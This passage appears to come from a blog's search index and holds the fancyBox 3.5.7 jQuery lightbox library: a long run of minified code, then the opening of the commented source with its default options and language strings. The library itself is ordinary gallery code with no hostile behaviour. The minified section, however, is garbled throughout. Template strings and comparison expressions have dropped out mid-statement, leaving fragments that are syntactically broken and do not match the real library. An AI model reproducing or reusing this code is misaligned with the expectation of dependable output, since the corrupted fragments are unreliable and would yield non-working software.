o,i,a,s=[],r=0;t&&t.isDefaultPrevented()||(t.preventDefault(),e=e||{},t&&t.data&&(e=h(t.data.options,e)),o=e.$target||n(t.currentTarget).trigger(\"blur\"),(a=n.fancybox.getInstance())&&a.$trigger&&a.$trigger.is(o)||(e.selector?s=n(e.selector):(i=o.attr(\"data-fancybox\")||\"\",i?(s=t.data?t.data.items:[],s=s.length?s.filter('[data-fancybox=\"'+i+'\"]'):n('[data-fancybox=\"'+i+'\"]')):s=[o]),r=n(s).index(o),r',preload:!0,css:{},attr:{scrolling:\"auto\"}},video:{tpl:'Sorry, your browser doesn\\'t support embedded videos, download and watch with your favorite video player!',format:\"\",autoStart:!0},defaultType:\"image\",animationEffect:\"zoom\",animationDuration:366,zoomOpacity:\"auto\",transitionEffect:\"fade\",transitionDuration:366,slideClass:\"\",baseClass:\"\",baseTpl:'&nbsp;/&nbsp;',spinnerTpl:'',errorTpl:'',btnTpl:{download:'',zoom:'',close:'',arrowLeft:'',arrowRight:'',smallBtn:''},parentEl:\"body\",hideScrollbar:!0,autoFocus:!0,backFocus:!0,trapFocus:!0,fullScreen:{autoStart:!1},touch:{vertical:!0,momentum:!0},hash:null,media:{},slideShow:{autoStart:!1,speed:3e3},thumbs:{autoStart:!1,hideOnClose:!0,parentEl:\".fancybox-container\",axis:\"y\"},wheel:\"auto\",onInit:n.noop,beforeLoad:n.noop,afterLoad:n.noop,beforeShow:n.noop,afterShow:n.noop,beforeClose:n.noop,afterClose:n.noop,onActivate:n.noop,onDeactivate:n.noop,clickContent:function(t,e){return\"image\"===t.type&&\"zoom\"},clickSlide:\"close\",clickOutside:\"close\",dblclickContent:!1,dblclickSlide:!1,dblclickOutside:!1,mobile:{preventCaptionOverlap:!1,idleTime:!1,clickContent:function(t,e){return\"image\"===t.type&&\"toggleControls\"},clickSlide:function(t,e){return\"image\"===t.type?\"toggleControls\":\"close\"},dblclickContent:function(t,e){return\"image\"===t.type&&\"zoom\"},dblclickSlide:function(t,e){return\"image\"===t.type&&\"zoom\"}},lang:\"en\",i18n:{en:{CLOSE:\"Close\",NEXT:\"Next\",PREV:\"Previous\",ERROR:\"The requested content cannot be loaded. Please try again later.\",PLAY_START:\"Start slideshow\",PLAY_STOP:\"Pause slideshow\",FULL_SCREEN:\"Full screen\",THUMBS:\"Thumbnails\",DOWNLOAD:\"Download\",SHARE:\"Share\",ZOOM:\"Zoom\"},de:{CLOSE:\"Schlie&szlig;en\",NEXT:\"Weiter\",PREV:\"Zur&uuml;ck\",ERROR:\"Die angeforderten Daten konnten nicht geladen werden. Bitte versuchen Sie es sp&auml;ter nochmal.\",PLAY_START:\"Diaschau starten\",PLAY_STOP:\"Diaschau beenden\",FULL_SCREEN:\"Vollbild\",THUMBS:\"Vorschaubilder\",DOWNLOAD:\"Herunterladen\",SHARE:\"Teilen\",ZOOM:\"Vergr&ouml;&szlig;ern\"}}},s=n(t),r=n(e),c=0,l=function(t){return t&&t.hasOwnProperty&&t instanceof n},d=function(){return t.requestAnimationFrame||t.webkitRequestAnimationFrame||t.mozRequestAnimationFrame||t.oRequestAnimationFrame||function(e){return t.setTimeout(e,1e3/60)}}(),u=function(){return t.cancelAnimationFrame||t.webkitCancelAnimationFrame||t.mozCancelAnimationFrame||t.oCancelAnimationFrame||function(e){t.clearTimeout(e)}}(),f=function(){var t,n=e.createElement(\"fakeelement\"),o={transition:\"transitionend\",OTransition:\"oTransitionEnd\",MozTransition:\"transitionend\",WebkitTransition:\"webkitTransitionEnd\"};for(t in o)if(void 0!==n.style[t])return o[t];return\"transitionend\"}(),p=function(t){return t&&t.length&&t[0].offsetHeight},h=function(t,e){var o=n.extend(!0,{},t,e);return n.each(e,function(t,e){n.isArray(e)&&(o[t]=e)}),o},g=function(t){var o,i;return!(!t||t.ownerDocument!==e)&&(n(\".fancybox-container\").css(\"pointer-events\",\"none\"),o={x:t.getBoundingClientRect().left+t.offsetWidth/2,y:t.getBoundingClientRect().top+t.offsetHeight/2},i=e.elementFromPoint(o.x,o.y)===t,n(\".fancybox-container\").css(\"pointer-events\",\"\"),i)},b=function(t,e,o){var i=this;i.opts=h({index:o},n.fancybox.defaults),n.isPlainObject(e)&&(i.opts=h(i.opts,e)),n.fancybox.isMobile&&(i.opts=h(i.opts,i.opts.mobile)),i.id=i.opts.id||++c,i.currIndex=parseInt(i.opts.index,10)||0,i.prevIndex=null,i.prevPos=null,i.currPos=0,i.firstRun=!0,i.group=[],i.slides={},i.addContent(t),i.group.length&&i.init()};n.extend(b.prototype,{init:function(){var o,i,a=this,s=a.group[a.currIndex],r=s.opts;r.closeExisting&&n.fancybox.close(!0),n(\"body\").addClass(\"fancybox-active\"),!n.fancybox.getInstance()&&!1!==r.hideScrollbar&&!n.fancybox.isMobile&&e.body.scrollHeight>t.innerHeight&&(n(\"head\").append('.compensate-for-scrollbar{margin-right:'+(t.innerWidth-e.documentElement.clientWidth)+\"px;}\"),n(\"body\").addClass(\"compensate-for-scrollbar\")),i=\"\",n.each(r.buttons,function(t,e){i+=r.btnTpl[e]||\"\"}),o=n(a.translate(a,r.baseTpl.replace(\"\",i).replace(\"\",r.btnTpl.arrowLeft+r.btnTpl.arrowRight))).attr(\"id\",\"fancybox-container-\"+a.id).addClass(r.baseClass).data(\"FancyBox\",a).appendTo(r.parentEl),a.$refs={container:o},[\"bg\",\"inner\",\"infobar\",\"toolbar\",\"stage\",\"caption\",\"navigation\"].forEach(function(t){a.$refs[t]=o.find(\".fancybox-\"+t)}),a.trigger(\"onInit\"),a.activate(),a.jumpTo(a.currIndex)},translate:function(t,e){var n=t.opts.i18n[t.opts.lang]||t.opts.i18n.en;return e.replace(/\\{\\{(\\w+)\\}\\}/g,function(t,e){return void 0===n[e]?t:n[e]})},addContent:function(t){var e,o=this,i=n.makeArray(t);n.each(i,function(t,e){var i,a,s,r,c,l={},d={};n.isPlainObject(e)?(l=e,d=e.opts||e):\"object\"===n.type(e)&&n(e).length?(i=n(e),d=i.data()||{},d=n.extend(!0,{},d,d.options),d.$orig=i,l.src=o.opts.src||d.src||i.attr(\"href\"),l.type||l.src||(l.type=\"inline\",l.src=e)):l={type:\"html\",src:e+\"\"},l.opts=n.extend(!0,{},o.opts,d),n.isArray(d.buttons)&&(l.opts.buttons=d.buttons),n.fancybox.isMobile&&l.opts.mobile&&(l.opts=h(l.opts,l.opts.mobile)),a=l.type||l.opts.type,r=l.src||\"\",!a&&r&&((s=r.match(/\\.(mp4|mov|ogv|webm)((\\?|#).*)?$/i))?(a=\"video\",l.opts.video.format||(l.opts.video.format=\"video/\"+(\"ogv\"===s[1]?\"ogg\":s[1]))):r.match(/(^data:image\\/[a-z0-9+\\/=]*,)|(\\.(jp(e|g|eg)|gif|png|bmp|webp|svg|ico)((\\?|#).*)?$)/i)?a=\"image\":r.match(/\\.(pdf)((\\?|#).*)?$/i)?(a=\"iframe\",l=n.extend(!0,l,{contentType:\"pdf\",opts:{iframe:{preload:!1}}})):\"#\"===r.charAt(0)&&(a=\"inline\")),a?l.type=a:o.trigger(\"objectNeedsType\",l),l.contentType||(l.contentType=n.inArray(l.type,[\"html\",\"inline\",\"ajax\"])>-1?\"html\":l.type),l.index=o.group.length,\"auto\"==l.opts.smallBtn&&(l.opts.smallBtn=n.inArray(l.type,[\"html\",\"inline\",\"ajax\"])>-1),\"auto\"===l.opts.toolbar&&(l.opts.toolbar=!l.opts.smallBtn),l.$thumb=l.opts.$thumb||null,l.opts.$trigger&&l.index===o.opts.index&&(l.$thumb=l.opts.$trigger.find(\"img:first\"),l.$thumb.length&&(l.opts.$orig=l.opts.$trigger)),l.$thumb&&l.$thumb.length||!l.opts.$orig||(l.$thumb=l.opts.$orig.find(\"img:first\")),l.$thumb&&!l.$thumb.length&&(l.$thumb=null),l.thumb=l.opts.thumb||(l.$thumb?l.$thumb[0].src:null),\"function\"===n.type(l.opts.caption)&&(l.opts.caption=l.opts.caption.apply(e,[o,l])),\"function\"===n.type(o.opts.caption)&&(l.opts.caption=o.opts.caption.apply(e,[o,l])),l.opts.caption instanceof n||(l.opts.caption=void 0===l.opts.caption?\"\":l.opts.caption+\"\"),\"ajax\"===l.type&&(c=r.split(/\\s+/,2),c.length>1&&(l.src=c.shift(),l.opts.filter=c.shift())),l.opts.modal&&(l.opts=n.extend(!0,l.opts,{trapFocus:!0,infobar:0,toolbar:0,smallBtn:0,keyboard:0,slideShow:0,fullScreen:0,thumbs:0,touch:0,clickContent:!1,clickSlide:!1,clickOutside:!1,dblclickContent:!1,dblclickSlide:!1,dblclickOutside:!1})),o.group.push(l)}),Object.keys(o.slides).length&&(o.updateControls(),(e=o.Thumbs)&&e.isActive&&(e.create(),e.focus()))},addEvents:function(){var e=this;e.removeEvents(),e.$refs.container.on(\"click.fb-close\",\"[data-fancybox-close]\",function(t){t.stopPropagation(),t.preventDefault(),e.close(t)}).on(\"touchstart.fb-prev click.fb-prev\",\"[data-fancybox-prev]\",function(t){t.stopPropagation(),t.preventDefault(),e.previous()}).on(\"touchstart.fb-next click.fb-next\",\"[data-fancybox-next]\",function(t){t.stopPropagation(),t.preventDefault(),e.next()}).on(\"click.fb\",\"[data-fancybox-zoom]\",function(t){e[e.isScaledDown()?\"scaleToActual\":\"scaleToFit\"]()}),s.on(\"orientationchange.fb resize.fb\",function(t){t&&t.originalEvent&&\"resize\"===t.originalEvent.type?(e.requestId&&u(e.requestId),e.requestId=d(function(){e.update(t)})):(e.current&&\"iframe\"===e.current.type&&e.$refs.stage.hide(),setTimeout(function(){e.$refs.stage.show(),e.update(t)},n.fancybox.isMobile?600:250))}),r.on(\"keydown.fb\",function(t){var o=n.fancybox?n.fancybox.getInstance():null,i=o.current,a=t.keyCode||t.which;if(9==a)return void(i.opts.trapFocus&&e.focus(t));if(!(!i.opts.keyboard||t.ctrlKey||t.altKey||t.shiftKey||n(t.target).is(\"input,textarea,video,audio,select\")))return 8===a||27===a?(t.preventDefault(),void e.close(t)):37===a||38===a?(t.preventDefault(),void e.previous()):39===a||40===a?(t.preventDefault(),void e.next()):void e.trigger(\"afterKeydown\",t,a)}),e.group[e.currIndex].opts.idleTime&&(e.idleSecondsCounter=0,r.on(\"mousemove.fb-idle mouseleave.fb-idle mousedown.fb-idle touchstart.fb-idle touchmove.fb-idle scroll.fb-idle keydown.fb-idle\",function(t){e.idleSecondsCounter=0,e.isIdle&&e.showControls(),e.isIdle=!1}),e.idleInterval=t.setInterval(function(){++e.idleSecondsCounter>=e.group[e.currIndex].opts.idleTime&&!e.isDragging&&(e.isIdle=!0,e.idleSecondsCounter=0,e.hideControls())},1e3))},removeEvents:function(){var e=this;s.off(\"orientationchange.fb resize.fb\"),r.off(\"keydown.fb .fb-idle\"),this.$refs.container.off(\".fb-close .fb-prev .fb-next\"),e.idleInterval&&(t.clearInterval(e.idleInterval),e.idleInterval=null)},previous:function(t){return this.jumpTo(this.currPos-1,t)},next:function(t){return this.jumpTo(this.currPos+1,t)},jumpTo:function(t,e){var o,i,a,s,r,c,l,d,u,f=this,h=f.group.length;if(!(f.isDragging||f.isClosing||f.isAnimating&&f.firstRun)){if(t=parseInt(t,10),!(a=f.current?f.current.opts.loop:f.opts.loop)&&(t=h))return!1;if(o=f.firstRun=!Object.keys(f.slides).length,r=f.current,f.prevIndex=f.currIndex,f.prevPos=f.currPos,s=f.createSlide(t),h>1&&((a||s.index0)&&f.createSlide(t-1)),f.current=s,f.currIndex=s.index,f.currPos=s.pos,f.trigger(\"beforeShow\",o),f.updateControls(),s.forcedDuration=void 0,n.isNumeric(e)?s.forcedDuration=e:e=s.opts[o?\"animationDuration\":\"transitionDuration\"],e=parseInt(e,10),i=f.isMoved(s),s.$slide.addClass(\"fancybox-slide--current\"),o)return s.opts.animationEffect&&e&&f.$refs.container.css(\"transition-duration\",e+\"ms\"),f.$refs.container.addClass(\"fancybox-is-open\").trigger(\"focus\"),f.loadSlide(s),void f.preload(\"image\");c=n.fancybox.getTranslate(r.$slide),l=n.fancybox.getTranslate(f.$refs.stage),n.each(f.slides,function(t,e){n.fancybox.stop(e.$slide,!0)}),r.pos!==s.pos&&(r.isComplete=!1),r.$slide.removeClass(\"fancybox-slide--complete fancybox-slide--current\"),i?(u=c.left-(r.pos*c.width+r.pos*r.opts.gutter),n.each(f.slides,function(t,o){o.$slide.removeClass(\"fancybox-animated\").removeClass(function(t,e){return(e.match(/(^|\\s)fancybox-fx-\\S+/g)||[]).join(\" \")});var i=o.pos*c.width+o.pos*o.opts.gutter;n.fancybox.setTranslate(o.$slide,{top:0,left:i-l.left+u}),o.pos!==s.pos&&o.$slide.addClass(\"fancybox-slide--\"+(o.pos>s.pos?\"next\":\"previous\")),p(o.$slide),n.fancybox.animate(o.$slide,{top:0,left:(o.pos-s.pos)*c.width+(o.pos-s.pos)*o.opts.gutter},e,function(){o.$slide.css({transform:\"\",opacity:\"\"}).removeClass(\"fancybox-slide--next fancybox-slide--previous\"),o.pos===f.currPos&&f.complete()})})):e&&s.opts.transitionEffect&&(d=\"fancybox-animated fancybox-fx-\"+s.opts.transitionEffect,r.$slide.addClass(\"fancybox-slide--\"+(r.pos>s.pos?\"next\":\"previous\")),n.fancybox.animate(r.$slide,d,e,function(){r.$slide.removeClass(d).removeClass(\"fancybox-slide--next fancybox-slide--previous\")},!1)),s.isLoaded?f.revealContent(s):f.loadSlide(s),f.preload(\"image\")}},createSlide:function(t){var e,o,i=this;return o=t%i.group.length,o=of&&(a=i.left*r-(t*r-t),a>0&&(a=0),ap&&(s=i.top*c-(e*c-e),s>0&&(s=0),se-.5&&(l=e),d>o-.5&&(d=o),\"image\"===t.type?(u.top=Math.floor(.5*(o-d))+parseFloat(c.css(\"paddingTop\")),u.left=Math.floor(.5*(e-l))+parseFloat(c.css(\"paddingLeft\"))):\"video\"===t.contentType&&(a=t.opts.width&&t.opts.height?l/d:t.opts.ratio||16/9,d>l/a?d=l/a:l>d*a&&(l=d*a)),u.width=l,u.height=d,u)},update:function(t){var e=this;n.each(e.slides,function(n,o){e.updateSlide(o,t)})},updateSlide:function(t,e){var o=this,i=t&&t.$content,a=t.width||t.opts.width,s=t.height||t.opts.height,r=t.$slide;o.adjustCaption(t),i&&(a||s||\"video\"===t.contentType)&&!t.hasError&&(n.fancybox.stop(i),n.fancybox.setTranslate(i,o.getFitPos(t)),t.pos===o.currPos&&(o.isAnimating=!1,o.updateCursor())),o.adjustLayout(t),r.length&&(r.trigger(\"refresh\"),t.pos===o.currPos&&o.$refs.toolbar.add(o.$refs.navigation.find(\".fancybox-button--arrow_right\")).toggleClass(\"compensate-for-scrollbar\",r.get(0).scrollHeight>r.get(0).clientHeight)),o.trigger(\"onUpdate\",t,e)},centerSlide:function(t){var e=this,o=e.current,i=o.$slide;!e.isClosing&&o&&(i.siblings().css({transform:\"\",opacity:\"\"}),i.parent().children().removeClass(\"fancybox-slide--previous fancybox-slide--next\"),n.fancybox.animate(i,{top:0,left:0,opacity:1},void 0===t?0:t,function(){i.css({transform:\"\",opacity:\"\"}),o.isComplete||e.complete()},!1))},isMoved:function(t){var e,o,i=t||this.current;return!!i&&(o=n.fancybox.getTranslate(this.$refs.stage),e=n.fancybox.getTranslate(i.$slide),!i.$slide.hasClass(\"fancybox-animated\")&&(Math.abs(e.top-o.top)>.5||Math.abs(e.left-o.left)>.5))},updateCursor:function(t,e){var o,i,a=this,s=a.current,r=a.$refs.container;s&&!a.isClosing&&a.Guestures&&(r.removeClass(\"fancybox-is-zoomable fancybox-can-zoomIn fancybox-can-zoomOut fancybox-can-swipe fancybox-can-pan\"),o=a.canPan(t,e),i=!!o||a.isZoomable(),r.toggleClass(\"fancybox-is-zoomable\",i),n(\"[data-fancybox-zoom]\").prop(\"disabled\",!i),o?r.addClass(\"fancybox-can-pan\"):i&&(\"zoom\"===s.opts.clickContent||n.isFunction(s.opts.clickContent)&&\"zoom\"==s.opts.clickContent(s))?r.addClass(\"fancybox-can-zoomIn\"):s.opts.touch&&(s.opts.touch.vertical||a.group.length>1)&&\"video\"!==s.contentType&&r.addClass(\"fancybox-can-swipe\"))},isZoomable:function(){var t,e=this,n=e.current;if(n&&!e.isClosing&&\"image\"===n.type&&!n.hasError){if(!n.isLoaded)return!0;if((t=e.getFitPos(n))&&(n.width>t.width||n.height>t.height))return!0}return!1},isScaledDown:function(t,e){var o=this,i=!1,a=o.current,s=a.$content;return void 0!==t&&void 0!==e?i=t1&&s.width()/s.height()>1?\"100\":Math.round(t.width/t.height*100))+\"vw\"),a.attr(\"sizes\",e).attr(\"srcset\",t.opts.srcset)),t.$ghost&&setTimeout(function(){t.$ghost&&!o.isClosing&&t.$ghost.hide()},Math.min(300,Math.max(1e3,t.height/1600))),o.hideLoading(t))}).addClass(\"fancybox-image\").attr(\"src\",t.src).appendTo(t.$content),(i.complete||\"complete\"==i.readyState)&&a.naturalWidth&&a.naturalHeight?a.trigger(\"load\"):i.error&&a.trigger(\"error\")},resolveImageSlideSize:function(t,e,n){var o=parseInt(t.opts.width,10),i=parseInt(t.opts.height,10);t.width=e,t.height=n,o>0&&(t.width=o,t.height=Math.floor(o*n/e)),i>0&&(t.width=Math.floor(i*e/n),t.height=i)},setIframe:function(t){var e,o=this,i=t.opts.iframe,a=t.$slide;t.$content=n('').css(i.css).appendTo(a),a.addClass(\"fancybox-slide--\"+t.contentType),t.$iframe=e=n(i.tpl.replace(/\\{rnd\\}/g,(new Date).getTime())).attr(i.attr).appendTo(t.$content),i.preload?(o.showLoading(t),e.on(\"load.fb error.fb\",function(e){this.isReady=1,t.$slide.trigger(\"refresh\"),o.afterLoad(t)}),a.on(\"refresh.fb\",function(){var n,o,s=t.$content,r=i.css.width,c=i.css.height;if(1===e[0].isReady){try{n=e.contents(),o=n.find(\"body\")}catch(t){}o&&o.length&&o.children().length&&(a.css(\"overflow\",\"visible\"),s.css({width:\"100%\",\"max-width\":\"100%\",height:\"9999px\"}),void 0===r&&(r=Math.ceil(Math.max(o[0].clientWidth,o.outerWidth(!0)))),s.css(\"width\",r||\"\").css(\"max-width\",\"\"),void 0===c&&(c=Math.ceil(Math.max(o[0].clientHeight,o.outerHeight(!0)))),s.css(\"height\",c||\"\"),a.css(\"overflow\",\"auto\")),s.removeClass(\"fancybox-is-hidden\")}})):o.afterLoad(t),e.attr(\"src\",t.src),a.one(\"onReset\",function(){try{n(this).find(\"iframe\").hide().unbind().attr(\"src\",\"//about:blank\")}catch(t){}n(this).off(\"refresh.fb\").empty(),t.isLoaded=!1,t.isRevealed=!1})},setContent:function(t,e){var o=this;o.isClosing||(o.hideLoading(t),t.$content&&n.fancybox.stop(t.$content),t.$slide.empty(),l(e)&&e.parent().length?((e.hasClass(\"fancybox-content\")||e.parent().hasClass(\"fancybox-content\"))&&e.parents(\".fancybox-slide\").trigger(\"onReset\"),t.$placeholder=n(\"\").hide().insertAfter(e),e.css(\"display\",\"inline-block\")):t.hasError||(\"string\"===n.type(e)&&(e=n(\"\").append(n.trim(e)).contents()),t.opts.filter&&(e=n(\"\").html(e).find(t.opts.filter))),t.$slide.one(\"onReset\",function(){n(this).find(\"video,audio\").trigger(\"pause\"),t.$placeholder&&(t.$placeholder.after(e.removeClass(\"fancybox-content\").hide()).remove(),t.$placeholder=null),t.$smallBtn&&(t.$smallBtn.remove(),t.$smallBtn=null),t.hasError||(n(this).empty(),t.isLoaded=!1,t.isRevealed=!1)}),n(e).appendTo(t.$slide),n(e).is(\"video,audio\")&&(n(e).addClass(\"fancybox-video\"),n(e).wrap(\"\"),t.contentType=\"video\",t.opts.width=t.opts.width||n(e).attr(\"width\"),t.opts.height=t.opts.height||n(e).attr(\"height\")),t.$content=t.$slide.children().filter(\"div,form,main,video,audio,article,.fancybox-content\").first(),t.$content.siblings().hide(),t.$content.length||(t.$content=t.$slide.wrapInner(\"\").children().first()),t.$content.addClass(\"fancybox-content\"),t.$slide.addClass(\"fancybox-slide--\"+t.contentType),o.afterLoad(t))},setError:function(t){t.hasError=!0,t.$slide.trigger(\"onReset\").removeClass(\"fancybox-slide--\"+t.contentType).addClass(\"fancybox-slide--error\"),t.contentType=\"html\",this.setContent(t,this.translate(t,t.opts.errorTpl)),t.pos===this.currPos&&(this.isAnimating=!1)},showLoading:function(t){var e=this;(t=t||e.current)&&!t.$spinner&&(t.$spinner=n(e.translate(e,e.opts.spinnerTpl)).appendTo(t.$slide).hide().fadeIn(\"fast\"))},hideLoading:function(t){var e=this;(t=t||e.current)&&t.$spinner&&(t.$spinner.stop().remove(),delete t.$spinner)},afterLoad:function(t){var e=this;e.isClosing||(t.isLoading=!1,t.isLoaded=!0,e.trigger(\"afterLoad\",t),e.hideLoading(t),!t.opts.smallBtn||t.$smallBtn&&t.$smallBtn.length||(t.$smallBtn=n(e.translate(t,t.opts.btnTpl.smallBtn)).appendTo(t.$content)),t.opts.protect&&t.$content&&!t.hasError&&(t.$content.on(\"contextmenu.fb\",function(t){return 2==t.button&&t.preventDefault(),!0}),\"image\"===t.type&&n('').appendTo(t.$content)),e.adjustCaption(t),e.adjustLayout(t),t.pos===e.currPos&&e.updateCursor(),e.revealContent(t))},adjustCaption:function(t){var e,n=this,o=t||n.current,i=o.opts.caption,a=o.opts.preventCaptionOverlap,s=n.$refs.caption,r=!1;s.toggleClass(\"fancybox-caption--separate\",a),a&&i&&i.length&&(o.pos!==n.currPos?(e=s.clone().appendTo(s.parent()),e.children().eq(0).empty().html(i),r=e.outerHeight(!0),e.empty().remove()):n.$caption&&(r=n.$caption.outerHeight(!0)),o.$slide.css(\"padding-bottom\",r||\"\"))},adjustLayout:function(t){var e,n,o,i,a=this,s=t||a.current;s.isLoaded&&!0!==s.opts.disableLayoutFix&&(s.$content.css(\"margin-bottom\",\"\"),s.$content.outerHeight()>s.$slide.height()+.5&&(o=s.$slide[0].style[\"padding-bottom\"],i=s.$slide.css(\"padding-bottom\"),parseFloat(i)>0&&(e=s.$slide[0].scrollHeight,s.$slide.css(\"padding-bottom\",0),Math.abs(e-s.$slide[0].scrollHeight).1),a&&(l.opacity=.1,c.opacity=1),n.fancybox.setTranslate(t.$content.removeClass(\"fancybox-is-hidden\"),l),p(t.$content),void n.fancybox.animate(t.$content,c,i,function(){s.isAnimating=!1,s.complete()})):(s.updateSlide(t),e?(n.fancybox.stop(r),o=\"fancybox-slide--\"+(t.pos>=s.prevPos?\"next\":\"previous\")+\" fancybox-animated fancybox-fx-\"+e,r.addClass(o).removeClass(\"fancybox-slide--current\"),t.$content.removeClass(\"fancybox-is-hidden\"),p(r),\"image\"!==t.type&&t.$content.hide().show(0),void n.fancybox.animate(r,\"fancybox-slide--current\",i,function(){r.removeClass(o).css({transform:\"\",opacity:\"\"}),t.pos===s.currPos&&s.complete()},!0)):(t.$content.removeClass(\"fancybox-is-hidden\"),u||!d||\"image\"!==t.type||t.hasError||t.$content.hide().fadeIn(\"fast\"),void(t.pos===s.currPos&&s.complete())))},getThumbPos:function(t){var e,o,i,a,s,r=!1,c=t.$thumb;return!(!c||!g(c[0]))&&(e=n.fancybox.getTranslate(c),o=parseFloat(c.css(\"border-top-width\")||0),i=parseFloat(c.css(\"border-right-width\")||0),a=parseFloat(c.css(\"border-bottom-width\")||0),s=parseFloat(c.css(\"border-left-width\")||0),r={top:e.top+o,left:e.left+s,width:e.width-i-s,height:e.height-o-a,scaleX:1,scaleY:1},e.width>0&&e.height>0&&r)},complete:function(){var t,e=this,o=e.current,i={};!e.isMoved()&&o.isLoaded&&(o.isComplete||(o.isComplete=!0,o.$slide.siblings().trigger(\"onReset\"),e.preload(\"inline\"),p(o.$slide),o.$slide.addClass(\"fancybox-slide--complete\"),n.each(e.slides,function(t,o){o.pos>=e.currPos-1&&o.pos.1),r&&(l.opacity=0),n.fancybox.setTranslate(a,c),p(a),n.fancybox.animate(a,l,i,h),!0):(o&&i?n.fancybox.animate(f.$slide.addClass(\"fancybox-slide--previous\").removeClass(\"fancybox-slide--current\"),\"fancybox-animated fancybox-fx-\"+o,i,h):!0===t?setTimeout(h,i):h(),!0)))},cleanUp:function(e){var o,i,a,s=this,r=s.current.opts.$orig;s.current.$slide.trigger(\"onReset\"),s.$refs.container.empty().remove(),s.trigger(\"afterClose\",e),s.current.opts.backFocus&&(r&&r.length&&r.is(\":visible\")||(r=s.$trigger),r&&r.length&&(i=t.scrollX,a=t.scrollY,r.trigger(\"focus\"),n(\"html, body\").scrollTop(a).scrollLeft(i))),s.current=null,o=n.fancybox.getInstance(),o?o.activate():(n(\"body\").removeClass(\"fancybox-active compensate-for-scrollbar\"),n(\"#fancybox-style-noscroll\").remove())},trigger:function(t,e){var o,i=Array.prototype.slice.call(arguments,1),a=this,s=e&&e.opts?e:a.current;if(s?i.unshift(s):s=a,i.unshift(a),n.isFunction(s.opts[t])&&(o=s.opts[t].apply(s,i)),!1===o)return o;\"afterClose\"!==t&&a.$refs?a.$refs.container.trigger(t+\".fb\",i):r.trigger(t+\".fb\",i)},updateControls:function(){var t=this,o=t.current,i=o.index,a=t.$refs.container,s=t.$refs.caption,r=o.opts.caption;o.$slide.trigger(\"refresh\"),r&&r.length?(t.$caption=s,s.children().eq(0).html(r)):t.$caption=null,t.hasHiddenControls||t.isIdle||t.showControls(),a.find(\"[data-fancybox-count]\").html(t.group.length),a.find(\"[data-fancybox-index]\").html(i+1),a.find(\"[data-fancybox-prev]\").prop(\"disabled\",!o.opts.loop&&i=t.group.length-1),\"image\"===o.type?a.find(\"[data-fancybox-zoom]\").show().end().find(\"[data-fancybox-download]\").attr(\"href\",o.opts.image.src||o.src).show():o.opts.toolbar&&a.find(\"[data-fancybox-download],[data-fancybox-zoom]\").hide(),n(e.activeElement).is(\":hidden,[disabled]\")&&t.$refs.container.trigger(\"focus\")},hideControls:function(t){var e=this,n=[\"infobar\",\"toolbar\",\"nav\"];!t&&e.current.opts.preventCaptionOverlap||n.push(\"caption\"),this.$refs.container.removeClass(n.map(function(t){return\"fancybox-show-\"+t}).join(\" \")),this.hasHiddenControls=!0},showControls:function(){var t=this,e=t.current?t.current.opts:t.opts,n=t.$refs.container;t.hasHiddenControls=!1,t.idleSecondsCounter=0,n.toggleClass(\"fancybox-show-toolbar\",!(!e.toolbar||!e.buttons)).toggleClass(\"fancybox-show-infobar\",!!(e.infobar&&t.group.length>1)).toggleClass(\"fancybox-show-caption\",!!t.$caption).toggleClass(\"fancybox-show-nav\",!!(e.arrows&&t.group.length>1)).toggleClass(\"fancybox-is-modal\",!!e.modal)},toggleControls:function(){this.hasHiddenControls?this.showControls():this.hideControls()}}),n.fancybox={version:\"3.5.7\",defaults:a,getInstance:function(t){var e=n('.fancybox-container:not(\".fancybox-is-closing\"):last').data(\"FancyBox\"),o=Array.prototype.slice.call(arguments,1);return e instanceof b&&(\"string\"===n.type(t)?e[t].apply(e,o):\"function\"===n.type(t)&&t.apply(e,o),e)},open:function(t,e,n){return new b(t,e,n)},close:function(t){var e=this.getInstance();e&&(e.close(),!0===t&&this.close(t))},destroy:function(){this.close(!0),r.add(\"body\").off(\"click.fb-start\",\"**\")},isMobile:/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),use3d:function(){var n=e.createElement(\"div\");return t.getComputedStyle&&t.getComputedStyle(n)&&t.getComputedStyle(n).getPropertyValue(\"transform\")&&!(e.documentMode&&e.documentMode"},{"title":"","date":"2020-08-14T05:39:27.746Z","updated":"2020-08-14T05:39:27.746Z","comments":true,"path":"lib/fancybox/source/jquery.fancybox.pack.js","permalink":"https://0range228.github.io/lib/fancybox/source/jquery.fancybox.pack.js","excerpt":"","text":"// ================================================== // fancyBox v3.5.7 // // Licensed GPLv3 for open source use // or fancyBox Commercial License for commercial use // // http://fancyapps.com/fancybox/ // Copyright 2019 fancyApps // // ================================================== (function (window, document, $, undefined) { \"use strict\"; window.console = window.console || { info: function (stuff) {} }; // If there's no jQuery, fancyBox can't work // ========================================= if (!$) { return; } // Check if fancyBox is already initialized // ======================================== if ($.fn.fancybox) { console.info(\"fancyBox already initialized\"); return; } // Private default settings // ======================== var defaults = { // Close existing modals // Set this to false if you do not need to stack multiple instances closeExisting: false, // Enable infinite gallery navigation loop: false, // Horizontal space between slides gutter: 50, // Enable keyboard navigation keyboard: true, // Should allow caption to overlap the content preventCaptionOverlap: true, // Should display navigation arrows at the screen edges arrows: true, // Should display counter at the top left corner infobar: true, // Should display close button (using `btnTpl.smallBtn` template) over the content // Can be true, false, \"auto\" // If \"auto\" - will be automatically enabled for \"html\", \"inline\" or \"ajax\" items smallBtn: \"auto\", // Should display toolbar (buttons at the top) // Can be true, false, \"auto\" // If \"auto\" - will be automatically hidden if \"smallBtn\" is enabled toolbar: \"auto\", // What buttons should appear in the top right corner. // Buttons will be created using templates from `btnTpl` option // and they will be placed into toolbar (class=\"fancybox-toolbar\"` element) buttons: [ \"zoom\", //\"share\", \"slideShow\", //\"fullScreen\", //\"download\", \"thumbs\", \"close\" ], // Detect \"idle\" time in seconds idleTime: 3, // Disable right-click and use simple image protection for images protect: false, // Shortcut to make content \"modal\" - disable keyboard navigtion, hide buttons, etc modal: false, image: { // Wait for images to load before displaying // true - wait for image to load and then display; // false - display thumbnail and load the full-sized image over top, // requires predefined image dimensions (`data-width` and `data-height` attributes) preload: false }, ajax: { // Object containing settings for ajax request settings: { // This helps to indicate that request comes from the modal // Feel free to change naming data: { fancybox: true } } }, iframe: { // Iframe template tpl: '', // Preload iframe before displaying it // This allows to calculate iframe content width and height // (note: Due to \"Same Origin Policy\", you can't get cross domain data). preload: true, // Custom CSS styling for iframe wrapping element // You can use this to set custom iframe dimensions css: {}, // Iframe tag attributes attr: { scrolling: \"auto\" } }, // For HTML5 video only video: { tpl: '' + '' + 'Sorry, your browser doesn\\'t support embedded videos, download and watch 